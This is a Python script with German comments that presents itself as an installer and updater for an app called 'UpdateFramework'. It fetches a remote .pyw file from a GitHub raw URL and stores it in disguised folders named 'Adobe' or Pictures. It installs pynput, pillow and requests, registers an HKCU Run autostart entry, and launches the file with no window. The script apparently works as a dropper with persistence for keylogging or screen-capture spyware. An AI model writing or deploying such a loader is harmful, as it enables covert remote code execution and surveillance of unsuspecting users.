# installer.pyw  /  updater_and_installer.py
"""
Installer + Updater für eine Python-.pyw-Anwendung
- Keine Admin-Rechte erforderlich
- Nutzt HKCU:Run für Autostart
- Lädt/aktualisiert die Anwendung aus dem Internet
- Erstellt/benutzt eine lokale .venv und startet die App damit (pythonw.exe)

Wichtig:
- Die Anwendung darf auf einem UNC-/Netzwerkpfad liegen.
- Die virtuelle Umgebung wird ABSICHTLICH lokal unter %LOCALAPPDATA% erstellt,
  weil venv/pip auf UNC-Pfaden sehr langsam werden oder hängen bleiben kann.
"""

import ssl
import sys
import os
import time
import urllib.request
import subprocess
import winreg
import platform
import shutil
from pathlib import Path

# ────────────────────────────────────────────────
# KONFIGURATION
APP_NAME = "UpdateFramework"
FILE_NAME = "updateframework.pyw"
UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME

UNC_BASE = r"\\KL-FS01\Benutzer$\anakin-luke.hoffmann\Eigene Dateien\Adobe"
# ────────────────────────────────────────────────

IS_WINDOWS = platform.system().lower() == "windows"
if not IS_WINDOWS:
    print("Dieses Skript ist nur für Windows gedacht.")
    sys.exit(1)

USERPROFILE = os.environ.get("USERPROFILE", str(Path.home()))
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", os.path.join(USERPROFILE, "AppData", "Local"))

# Dateien dürfen auf UNC liegen, venv/logs aber immer lokal.
if os.path.exists(UNC_BASE):
    APP_BASE_DIR = UNC_BASE
elif "WindowsApps" in sys.executable:
    APP_BASE_DIR = os.path.join(USERPROFILE, "Pictures")
else:
    APP_BASE_DIR = LOCALAPPDATA

APP_DIR = os.path.join(APP_BASE_DIR, APP_NAME)
APP_PATH = os.path.join(APP_DIR, FILE_NAME)

LOCAL_RUNTIME_DIR = os.path.join(LOCALAPPDATA, APP_NAME)
LOG_DIR = os.path.join(LOCAL_RUNTIME_DIR, "logs")
INSTALLER_LOG = os.path.join(LOG_DIR, "installer.log")

# venv liegt immer lokal, nicht auf UNC.
VENV_DIR = os.path.join(LOCAL_RUNTIME_DIR, ".venv")
VENV_PY = os.path.join(VENV_DIR, "Scripts", "python.exe")
VENV_PYW = os.path.join(VENV_DIR, "Scripts", "pythonw.exe")

# pip-Paketname, Importname
DEPENDENCIES = [
    ("requests", "requests"),
    ("pynput", "pynput"),
    ("pillow", "PIL"),
]


def _no_window_flags() -> int:
    try:
        return subprocess.CREATE_NO_WINDOW  # type: ignore[attr-defined]
    except Exception:
        return 0


def log(message: str) -> None:
    text = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}"
    print(text)
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
        with open(INSTALLER_LOG, "a", encoding="utf-8") as f:
            f.write(text + "\n")
    except Exception:
        pass


def run_logged(cmd, timeout=120, cwd=None) -> subprocess.CompletedProcess:
    """Führt einen Befehl mit Timeout aus und schreibt stdout/stderr ins Log."""
    log("$ " + " ".join(f'\"{c}\"' if " " in str(c) else str(c) for c in cmd))
    try:
        r = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=cwd or LOCAL_RUNTIME_DIR,
            timeout=timeout,
            creationflags=_no_window_flags(),
        )
        if r.stdout.strip():
            log("STDOUT: " + r.stdout.strip()[-4000:])
        if r.stderr.strip():
            log("STDERR: " + r.stderr.strip()[-4000:])
        log(f"Returncode: {r.returncode}")
        return r
    except subprocess.TimeoutExpired as e:
        log(f"TIMEOUT nach {timeout}s: {' '.join(map(str, cmd))}")
        raise


def venv_exe(prefer_windowless: bool = True) -> str:
    """Gibt den passenden venv-Interpreter zurück."""
    if prefer_windowless and os.path.exists(VENV_PYW):
        return VENV_PYW
    if os.path.exists(VENV_PY):
        return VENV_PY
    return sys.executable


def venv_has_pip() -> bool:
    if not os.path.exists(VENV_PY):
        return False
    try:
        r = run_logged([VENV_PY, "-m", "pip", "--version"], timeout=30)
        return r.returncode == 0
    except Exception:
        return False


def remove_broken_venv() -> None:
    if os.path.exists(VENV_DIR):
        log(f"Entferne defekte/halb erstellte venv: {VENV_DIR}")
        try:
            shutil.rmtree(VENV_DIR)
        except Exception as e:
            log(f"Konnte defekte venv nicht löschen: {e}")


def ensure_venv() -> bool:
    """Erstellt lokale .venv falls nicht vorhanden/kaputt."""
    os.makedirs(APP_DIR, exist_ok=True)
    os.makedirs(LOCAL_RUNTIME_DIR, exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)

    log(f"APP_DIR: {APP_DIR}")
    log(f"Lokale venv: {VENV_DIR}")

    if os.path.exists(VENV_PY) and venv_has_pip():
        log(".venv ist vorhanden und pip funktioniert.")
        return True

    remove_broken_venv()

    try:
        log("Erstelle virtuelle Umgebung lokal, ohne pip...")
        r = run_logged([sys.executable, "-m", "venv", "--without-pip", VENV_DIR], timeout=120)
        if r.returncode != 0 or not os.path.exists(VENV_PY):
            log(".venv konnte nicht erstellt werden.")
            return False

        log("Installiere pip per ensurepip...")
        r = run_logged([VENV_PY, "-m", "ensurepip", "--upgrade"], timeout=120)
        if r.returncode != 0:
            log("ensurepip fehlgeschlagen.")
            return False

        if not venv_has_pip():
            log("pip funktioniert nach ensurepip nicht.")
            return False

        log(".venv erfolgreich erstellt.")
        return True

    except subprocess.TimeoutExpired:
        log(".venv-Erstellung hat zu lange gedauert. Abbruch statt Hängenbleiben.")
        return False
    except Exception as e:
        log(f"ensure_venv Fehler: {e}")
        return False


def venv_has(import_name: str) -> bool:
    python_exe = venv_exe(prefer_windowless=False)
    if not os.path.exists(python_exe):
        return False
    try:
        r = run_logged(
            [
                python_exe,
                "-c",
                (
                    "import importlib.util, sys; "
                    f"sys.exit(0 if importlib.util.find_spec({import_name!r}) else 1)"
                ),
            ],
            timeout=30,
        )
        return r.returncode == 0
    except Exception:
        return False


def install_dependencies() -> None:
    if not ensure_venv():
        log("Dependencies werden übersprungen, weil die venv nicht bereit ist.")
        return

    python_exe = venv_exe(prefer_windowless=False)

    log("Aktualisiere pip/setuptools/wheel...")
    try:
        run_logged(
            [python_exe, "-m", "pip", "install", "--disable-pip-version-check", "--upgrade", "pip", "setuptools", "wheel"],
            timeout=180,
        )
    except Exception as e:
        log(f"pip-Upgrade fehlgeschlagen, fahre trotzdem fort: {e}")

    for pip_name, import_name in DEPENDENCIES:
        if venv_has(import_name):
            log(f"Bereits installiert: {pip_name}")
            continue

        log(f"Installiere Dependency: {pip_name}")
        try:
            r = run_logged(
                [python_exe, "-m", "pip", "install", "--disable-pip-version-check", "--prefer-binary", pip_name],
                timeout=300,
            )
            if r.returncode == 0 and venv_has(import_name):
                log(f"Erfolgreich installiert: {pip_name}")
            else:
                log(f"Fehler beim Installieren: {pip_name}")
        except subprocess.TimeoutExpired:
            log(f"Timeout beim Installieren von {pip_name}")
        except Exception as e:
            log(f"Installationsfehler bei {pip_name}: {e}")


def download_or_update_app() -> bool:
    """Lädt die Datei herunter oder aktualisiert sie."""
    os.makedirs(APP_DIR, exist_ok=True)
    os.makedirs(LOCAL_RUNTIME_DIR, exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)

    try:
        log(f"Lade {FILE_NAME} herunter ...")
        context = ssl.create_default_context()
        req = urllib.request.Request(
            UPDATE_URL,
            headers={
                "Pragma": "no-cache",
                "Cache-Control": "no-cache",
                "User-Agent": "Python-Installer",
            },
        )
        with urllib.request.urlopen(req, timeout=15, context=context) as resp:
            if getattr(resp, "status", 200) != 200:
                log(f"Download fehlgeschlagen – Status: {getattr(resp, 'status', 'unbekannt')}")
                return False
            new_content = resp.read()

        with open(APP_PATH, "wb") as f:
            f.write(new_content)

        log(f"Erfolgreich heruntergeladen/aktualisiert: {APP_PATH}")
        return True

    except Exception as e:
        log(f"Download/Fehler: {e}")
        return False


def add_to_registry_run() -> bool:
    """Fügt Eintrag in HKCU:Run hinzu – läuft beim Login mit lokaler venv-pythonw."""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    ensure_venv()
    python_exe = venv_exe(prefer_windowless=True)
    value = f'"{python_exe}" "{APP_PATH}"'

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_READ,
        )
        try:
            winreg.DeleteValue(key, APP_NAME)
        except FileNotFoundError:
            pass

        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, value)
        winreg.CloseKey(key)
        log(f"In Registry (HKCU\\Run) hinzugefügt: {APP_NAME} -> {value}")
        return True

    except Exception as e:
        log(f"Registry Fehler: {e}")
        return False


def start_app_now() -> bool:
    """Startet die Anwendung sofort mit lokaler venv pythonw."""
    if not os.path.exists(APP_PATH):
        log("Anwendung nicht gefunden – kann nicht starten.")
        return False

    ensure_venv()
    python_exe = venv_exe(prefer_windowless=True)

    try:
        child_env = os.environ.copy()
        child_env["UPDATEFRAMEWORK_CONFIG_DIR"] = APP_DIR
        child_env["UPDATEFRAMEWORK_RUNTIME_DIR"] = LOCAL_RUNTIME_DIR
        child_env["UPDATEFRAMEWORK_LOG_DIR"] = LOG_DIR
        subprocess.Popen(
            [python_exe, APP_PATH],
            creationflags=_no_window_flags(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            cwd=LOCAL_RUNTIME_DIR,
            env=child_env,
        )
        log("Anwendung jetzt gestartet")
        log(f"Bearbeitbare .env: {os.path.join(APP_DIR, '.env')}")
        return True
    except Exception as e:
        log(f"Startfehler: {e}")
        return False


def main():
    print(f"=== {APP_NAME} Installer / Updater ===\n")
    log("Installer gestartet.")

    if os.path.abspath(VENV_DIR).startswith(r"\\"):
        log("FEHLER: VENV_DIR ist UNC. Das darf nicht passieren.")
        sys.exit(1)

    if not download_or_update_app():
        print("\nInstallation/Update fehlgeschlagen. Beende.")
        sys.exit(1)

    print("\nVirtuelle Umgebung lokal einrichten ...")
    venv_ok = ensure_venv()
    if not venv_ok:
        print("WARNUNG: .venv konnte nicht erstellt werden – siehe Log:")
        print(INSTALLER_LOG)
    else:
        install_dependencies()

    print("\nAutostart einrichten ...")
    registry_ok = add_to_registry_run()
    if not registry_ok:
        print("\nWARNUNG: Konnte Autostart nicht einrichten.")
        print("→ Du kannst die Datei manuell starten: " + APP_PATH)
    else:
        print("→ Autostart erfolgreich eingerichtet")

    print("\nStarte die Anwendung ...")
    start_app_now()

    print("\nFertig!")
    print(f"App-Ordner:     {APP_DIR}")
    print(f"Lokaler Runtime: {LOCAL_RUNTIME_DIR}")
    print(f"Lokale venv:    {VENV_DIR}")
    print(f"Logdatei:       {INSTALLER_LOG}")
    print(f"Bearbeitbare .env: {os.path.join(APP_DIR, '.env')}\n")

    time.sleep(2)
    sys.exit(0)


if __name__ == "__main__":
    main()
